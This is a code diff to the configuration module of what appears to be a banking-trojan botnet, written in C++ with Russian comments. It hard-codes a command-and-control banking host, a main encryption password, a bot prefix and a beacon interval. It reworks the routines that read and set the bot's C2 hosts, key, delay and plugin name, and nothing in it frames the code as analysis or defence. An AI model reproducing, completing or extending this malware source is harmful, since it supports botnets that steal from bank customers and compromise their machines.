@@ -56,7 +56,6 @@ namespace CONFIGDEBUGSTRINGS
 	// Интервал отстука (в минутах). Строковое значение
 	//----------------------------------------------------------------------------
 	char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;
-	#define DELAY_PARAM_NAME_HASH 0x59906EFB /* DELAY_ */
 
 	//----------------------------------------------------------------------------
 	// Префикс бота
@@ -92,11 +91,11 @@ namespace CONFIGDEBUGSTRINGS
 		char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = "rus.zika.in\0";
 	#endif
 
-	PCHAR MainPassword    = "bRS8yYQ0APq9xfzC";
+	char MainPassword[MAX_PASSWORD_SIZE + 1] = "bRS8yYQ0APq9xfzC";
 
 
-	char BOT_PREFIX[]     = "videorectest";
-	PCHAR DebugDelay      = "1";
+	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = "bsuurgfswnbg";
+	char Delay[MAX_DELAY_SIZE + 1]       = "1";
 
 #endif
 
@@ -329,12 +328,10 @@ string GetPrefix(bool CheckBankingMode)
 int GetDelay()
 {
 	PCHAR Str = NULL;
-	#ifdef DEBUGCONFIG
-		Str = DebugDelay;
-	#else
-		if (CalcHash(Delay) != DELAY_PARAM_NAME_HASH)
-			Str = Delay;
-	#endif
+
+	if (CalcHash(Delay) != BOTPARAM_HASH_DELAY)
+		Str = Delay;
+
 
 	int V = 0;
 	if (Str != NULL)
@@ -758,7 +755,7 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 			case BOT_PARAM_PREFIX:       Value = BOT_PREFIX;  break;
 			case BOT_PARAM_HOSTS:        Value = BOT_MAINHOSTS_ARRAY; break;
 			case BOT_PARAM_KEY:          Value = MainPassword; break;
-			case BOT_PARAM_DELAY:        Value = DebugDelay; break;
+			case BOT_PARAM_DELAY:        Value = Delay; break;
 			#ifdef USE_BANKING_HOSTS
 				case BOT_PARAM_BANKINGHOSTS: Value = BOT_BANKHOSTS_ARRAY; break;
 			#endif
@@ -831,86 +828,84 @@ DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
 
 BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
 {
-	#ifdef DEBUGCONFIG
+	if (STR::IsEmpty(Param))
 		return FALSE;
-	#else
-		if (STR::IsEmpty(Param))
-			return FALSE;
 
-		DWORD Size = 0;    // Размер  устанавливаемого параметра
-		LPVOID Buf = NULL; // Приёмный буфер
-		DWORD Max = 0;     // Максимально допустимый размер
+	DWORD Size = 0;    // Размер  устанавливаемого параметра
+	LPVOID Buf = NULL; // Приёмный буфер
+	DWORD Max = 0;     // Максимально допустимый размер
 
-		if (ParamID != BOT_PARAM_HOSTS)
-            Size = StrCalcLength(Param);
+	if (ParamID != BOT_PARAM_HOSTS)
+		Size = StrCalcLength(Param);
 
-		// Определяем приёмный буфер и размер параметра
+	// Определяем приёмный буфер и размер параметра
 
-		switch (ParamID) {
+	switch (ParamID) {
 
-			// Устанавливается префикс бота
-			case BOT_PARAM_PREFIX:
+		// Устанавливается префикс бота
+		case BOT_PARAM_PREFIX:
+			{
+				Buf = BOT_PREFIX;
+				Max = MAX_PREFIX_SIZE;
+				break;
+			}
+
+		// Устанавливаем хосты
+		case BOT_PARAM_HOSTS:
+			{
+				Size = STR::CalcDoubleZeroStrLength(Param);
+				Buf = BOT_MAINHOSTS_ARRAY;
+				Max = MAX_MAINHOSTS_BUF_SIZE;
+				break;
+			}
+
+		// Устанавливаем ключ шифрования
+		case BOT_PARAM_KEY:
+			{
+				Buf = MainPassword;
+				Max = MAX_PASSWORD_SIZE;
+				break;
+			}
+
+		// Устанавливаем задержку
+		case BOT_PARAM_DELAY:
+			{
+				Buf = Delay;
+				Max = MAX_DELAY_SIZE;
+				break;
+			}
+
+		// Устанавливаем имя плага
+		#ifndef DEBUGCONFIG
+		case BOT_PARAM_BOTPLUGNAME:
+			{
+				Buf = BotPlugName;
+				Max = MAX_BOT_PLUG_NAME_SIZE;
+				break;
+			}
+		#endif
+
+
+		// Устанавливаем хосты BANKING режима
+		#ifdef USE_BANKING_HOSTS
+			case BOT_PARAM_BANKINGHOSTS:
 				{
-					Buf = BOT_PREFIX;
-					Max = MAX_PREFIX_SIZE;
+					Buf = BOT_BANKHOSTS_ARRAY;
+					Max = MAX_BANKHOSTS_BUF_SIZE;
 					break;
 				}
+		#endif
 
-			// Устанавливаем хосты
-			case BOT_PARAM_HOSTS:
-				{
-                    Size = STR::CalcDoubleZeroStrLength(Param);
-					Buf = BOT_MAINHOSTS_ARRAY;
-					Max = MAX_MAINHOSTS_BUF_SIZE;
-					break;
-				}
-
-			// Устанавливаем ключ шифрования
-			case BOT_PARAM_KEY:
-				{
-					Buf = MainPassword;
-					Max = MAX_PASSWORD_SIZE;
-					break;
-				}
-
-			// Устанавливаем задержку
-			case BOT_PARAM_DELAY:
-				{
-					Buf = Delay;
-					Max = MAX_DELAY_SIZE;
-					break;
-				}
-
-			// Устанавливаем имя плага
-			case BOT_PARAM_BOTPLUGNAME:
-				{
-					Buf = BotPlugName;
-					Max = MAX_BOT_PLUG_NAME_SIZE;
-					break;
-				}
+	default: return FALSE;;
+	}
 
 
-			// Устанавливаем хосты BANKING режима
-			#ifdef USE_BANKING_HOSTS
-				case BOT_PARAM_BANKINGHOSTS:
-					{
-						Buf = BOT_BANKHOSTS_ARRAY;
-						Max = MAX_BANKHOSTS_BUF_SIZE;
-						break;
-					}
-			#endif
+	// Устанавливаем параметр
+	if (Size == 0 || Buf == NULL || (Max != 0 && Size > Max))
+		return FALSE;
 
-		default: return FALSE;;
-		}
-
-
-		// Устанавливаем параметр
-		if (Size == 0 || Buf == NULL || (Max != 0 && Size > Max))
-			return FALSE;
-
-        m_memset(Buf, 0, Max);
-        m_memcpy(Buf, Param, Size);
-        return TRUE;
-	#endif
+	m_memset(Buf, 0, Max);
+	m_memcpy(Buf, Param, Size);
+	return TRUE;
 }
 //----------------------------------------------------------------------------
